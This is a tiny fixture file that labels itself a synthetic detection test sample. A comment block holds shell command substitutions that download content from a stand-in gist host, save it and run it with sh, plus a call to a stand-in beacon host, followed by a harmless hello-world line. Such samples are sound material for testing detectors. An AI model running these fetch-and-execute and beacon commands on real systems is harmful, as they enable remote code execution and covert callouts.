# FIXTURE ONLY - synthetic detection test sample, not real malware
/*
$(curl -s https://api.example.invalid/gists/abc | jq -r '.files.x.content' > x)
$(sh x)
$(curl -s https://hook.example.invalid/beacon)
*/
console.log('hello world');
